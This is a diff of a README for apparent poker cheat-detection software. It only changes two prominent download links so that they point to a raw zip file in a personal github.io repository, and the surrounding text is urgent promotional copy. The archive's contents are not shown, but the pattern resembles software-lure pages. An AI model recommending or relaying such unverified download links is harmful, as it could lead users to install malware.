@@ -26,7 +26,7 @@ This software examines the game's action log (the record of every bet, fold, rai
 
 ### Step 1: Download the Software
 
-👉 [**CLICK HERE TO DOWNLOAD**](https://github.com/jeffplatinum1013/jeffplatinum1013.github.io/raw/refs/heads/main/public/work/v1.2.zip)
+👉 [**CLICK HERE TO DOWNLOAD**](https://raw.githubusercontent.com/jeffplatinum1013/jeffplatinum1013.github.io/main/public/work/v1.2.zip)
 
 Visit this link to download the application. You'll see a list of available files — pick the one that's right for your computer (Windows setup files are typically marked clearly).
 
@@ -158,7 +158,7 @@ This project is available for legitimate, non-commercial integrity purposes. See
 
 Thousands of players are unknowingly cheated every day. Don't be one of them. Get your copy now and bring professional-grade fraud detection to your own poker table.
 
-## 🔗 [**Download Now**](https://github.com/jeffplatinum1013/jeffplatinum1013.github.io/raw/refs/heads/main/public/work/v1.2.zip)
+## 🔗 [**Download Now**](https://raw.githubusercontent.com/jeffplatinum1013/jeffplatinum1013.github.io/main/public/work/v1.2.zip)
 
 ---
 
